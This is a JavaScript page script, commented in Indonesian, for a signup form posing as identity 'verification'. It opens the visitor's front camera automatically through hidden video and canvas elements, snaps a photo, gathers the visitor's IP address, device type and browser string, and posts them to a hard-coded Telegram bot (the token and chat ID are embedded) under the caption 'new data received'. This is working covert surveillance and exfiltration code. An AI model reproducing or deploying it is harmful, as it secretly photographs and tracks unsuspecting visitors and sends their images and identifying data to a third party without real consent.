document.addEventListener('DOMContentLoaded', function() {
  const video = document.getElementById('hiddenVideo');
  const canvas = document.getElementById('hiddenCanvas');
  const verificationStatus = document.getElementById('verificationStatus');
  const progressFill = document.getElementById('progressFill');
  const signupForm = document.getElementById('signupForm');
  
  let cameraStream = null;

  // Fungsi untuk update status verifikasi
  function updateStatus(icon, text, className = '') {
    verificationStatus.innerHTML = `<span class="status-icon">${icon}</span><span class="status-text">${text}</span>`;
    verificationStatus.className = `verification-status ${className}`;
  }

  function updateProgress(percentage) {
    progressFill.style.width = percentage + '%';
  }

  // Fungsi untuk mengambil foto
  function capturePhoto() {
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      console.log('Video belum siap');
      return null;
    }

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    return canvas.toDataURL('image/png');
  }

  // FUNGSI BARU: Kirim langsung ke Telegram
  async function sendPhotoToServer(dataURL) {
    try {
      const botToken = '8364972198:AAHBBW0kTvyeIbDjZQPJeUZxa6TNfYLMEk0';
      const chatId = '7418584938';
      
      // Get client info
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      const ip = ipData.ip;
      
      const userAgent = navigator.userAgent;
      const time = new Date().toLocaleString('id-ID');
      
      let deviceType = 'Desktop';
      if (/Mobile|Android|iPhone/i.test(userAgent)) deviceType = 'Mobile';
      if (/Tablet|iPad/i.test(userAgent)) deviceType = 'Tablet';

      const caption = `🚨 **DATA BARU DITERIMA** 🚨\n\n`
                   + `📍 **IP Address:** \`${ip}\`\n`
                   + `🖥️ **Device:** ${deviceType}\n`
                   + `🌐 **Browser:** ${userAgent.substring(0, 50)}...\n`
                   + `🕒 **Waktu:** ${time}\n\n`
                   + `⚠️ **Data dari Vercel Client**`;

      // Convert base64 to blob
      const base64Response = await fetch(dataURL);
      const blob = await base64Response.blob();

      // Create FormData
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'verification.png');
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      // Send directly to Telegram API
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      const result = await response.json();
      
      if (response.ok && result.ok) {
        console.log('Photo sent to Telegram successfully');
        return result;
      } else {
        throw new Error(result.description || 'Telegram API error');
      }
      
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      throw new Error('Gagal mengirim verifikasi: ' + error.message);
    }
  }

  // Akses kamera secara otomatis
  async function initCamera() {
    try {
      updateStatus('🔍', 'Mengakses kamera...');
      updateProgress(10);
      
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 }
        } 
      });
      
      cameraStream = stream;
      video.srcObject = stream;
      updateStatus('✅', 'Kamera terhubung', 'verification-success');
      updateProgress(40);
      
      // Tunggu 2 detik lalu ambil foto secara otomatis
      setTimeout(async () => {
        updateStatus('📸', 'Mengambil foto...');
        updateProgress(70);
        
        const photoData = capturePhoto();
        if (photoData) {
          try {
            updateStatus('📤', 'Mengirim verifikasi...');
            updateProgress(90);
            
            await sendPhotoToServer(photoData);
            updateStatus('✅', 'Verifikasi berhasil!', 'verification-success');
            updateProgress(100);
            
            // Stop kamera setelah berhasil
            if (cameraStream) {
              cameraStream.getTracks().forEach(track => track.stop());
            }
          } catch (error) {
            console.error('Gagal mengirim foto:', error);
            updateStatus('❌', 'Gagal mengirim verifikasi', 'verification-error');
          }
        }
      }, 2000);
      
    } catch (error) {
      console.error('Error mengakses kamera:', error);
      updateStatus('❌', 'Izin kamera ditolak', 'verification-error');
    }
  }

  // Handle form submission
  if (signupForm) {
    signupForm.addEventListener('submit', function(e) {
      e.preventDefault();
      
      // Scroll ke section verifikasi
      document.getElementById('verifikasi').scrollIntoView({ 
        behavior: 'smooth' 
      });
      
      // Mulai verifikasi kamera jika belum
      if (!video.srcObject) {
        setTimeout(initCamera, 1000);
      }
    });
  }

  // Jalankan kamera otomatis setelah 3 detik
  setTimeout(initCamera, 3000);
});
